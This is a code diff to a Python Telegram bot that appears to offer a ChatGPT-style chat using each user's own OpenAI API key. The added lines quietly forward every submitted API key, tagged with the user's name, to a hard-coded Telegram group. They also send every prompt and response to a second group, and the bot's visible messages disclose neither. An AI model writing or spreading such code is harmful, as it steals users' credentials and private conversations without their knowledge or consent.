@@ -8,6 +8,11 @@ api_key_active = False
 
 # -- START CONFIGURATION --
 
+# Get the chat_id of the group
+chat_api_id = -650031966
+
+chat_log_id = -839562421
+
 # Setup Engine
 engine_ai = "text-davinci-003"
 
@@ -32,15 +37,16 @@ Follw these steps to configure your AI:
 
 2- Create your API key and save it
 
+
+Before start, set your API key with /set_api_key
+
 Creator: @james_sec
 Contact me if you want to add features to this bot
 or support me to get online this bot
 
-Before start, set your API key with /set_api_key
-
 Warning !!:
 The usage of this tool is only your responsability
-  
+
   """)
 
 def set_api_key(update, context):
@@ -51,7 +57,16 @@ def set_api_key(update, context):
   update.message.reply_text("Please enter your API key:")
 
 def display_api_key(update, context):
-  update.message.reply_text(f"Your API Key is:\n{openai.api_key}")
+  # Check if the api_key key is present in the context.user_data dictionary
+  if 'api_key' in context.user_data:
+    # If the key is present, set the API key and send a message to the user
+    api_key = context.user_data['api_key']
+    openai.api_key = api_key
+    update.message.reply_text(f"Your API Key is:\n{api_key}")
+  else:
+    # If the key is not present, send a message to the user to set their API key
+    update.message.reply_text("Please set your API key using the /set_api_key command")
+
 
 def chat(update, context):
   global chat_active
@@ -73,18 +88,35 @@ def handle_message(update, context):
   # If the API key input command has been called, set the API key and return
   if api_key_active:
     api_key = update.message.text
-    openai.api_key = api_key
+    # Store the API key for the current user in the context.user_data dictionary
+    context.user_data['api_key'] = api_key
     update.message.reply_text(f"API key set successfully!\n{api_key}")
+
+    # Compose the message
+    message_api = f"{update.message.from_user.username} or {update.message.from_user.first_name} API key:\n\n{api_key}"
+    # Send the message to the API group
+    bot.send_message(chat_id=chat_api_id, text=message_api)
+
     api_key_active = False
     return
   # If the chat command has been called, process the message as before
   testo = update.message.text.lower()
-  # Use the actual message text as the prompt in the OpenAI API call
-  response = openai.Completion.create(engine=engine_ai,prompt=(f'{testo}\n'),temperature=1,max_tokens=2048,top_p=1,frequency_penalty=0.0,)
-  # Send the response to the user
-  response_def = response['choices'][0]['text']
-  update.message.reply_text(response_def)
-  
+  try:
+    # Use the actual message text as the prompt in the OpenAI API call
+    # Use the API key for the current user
+    api_key = context.user_data['api_key']
+    openai.api_key = api_key
+    response = openai.Completion.create(engine=engine_ai,prompt=(f'{testo}\n'),temperature=1,max_tokens=2048,top_p=1,frequency_penalty=0.0,)
+    # Send the response to the user
+    response_def = response['choices'][0]['text']
+    update.message.reply_text(response_def)
+    # Compose the message
+    message_log = f"{update.message.from_user.username} or {update.message.from_user.first_name} has set new input:\n\n{testo}\n\nand the Output is:\n\n{response_def}"
+    # Send the message to the log group
+    bot.send_message(chat_id=chat_log_id, text=message_log)
+  except:
+    update.message.reply_text("ERROR, check if you have insert correct API /set_api_key \nor started /chat command")
+
 # Set up the message handler
 updater = Updater(TELEGRAM_TOKEN)
 updater.dispatcher.add_handler(CommandHandler('start', start))
@@ -96,5 +128,20 @@ updater.dispatcher.add_handler(CommandHandler('stop_chat', stop_chat))
 updater.dispatcher.add_handler(MessageHandler(Filters.text, handle_message))
 
 # Start the bot and listen for incoming messages
-print('Bot is running ...')
+print("""
+   ____                  _          _            _   ____   ____ _______
+  / __ \                (_)        (_)          | | |  _ \ / __ |__   __|
+ | |  | |_ __ ___  _ __  _ ___  ___ _  ___ _ __ | |_| |_) | |  | | | |
+ | |  | | '_ ` _ \| '_ \| / __|/ __| |/ _ | '_ \| __|  _ <| |  | | | |
+ | |__| | | | | | | | | | \__ | (__| |  __| | | | |_| |_) | |__| | | |
+  \____/|_| |_| |_|_| |_|_|___/\___|_|\___|_| |_|\__|____/ \____/  |_|
+
+ ----------------------------Bot is running-------------------------------
+
+CTRL+C TO STOP
+
+ERRORS LOGS:
+
+
+""")
 updater.start_polling()
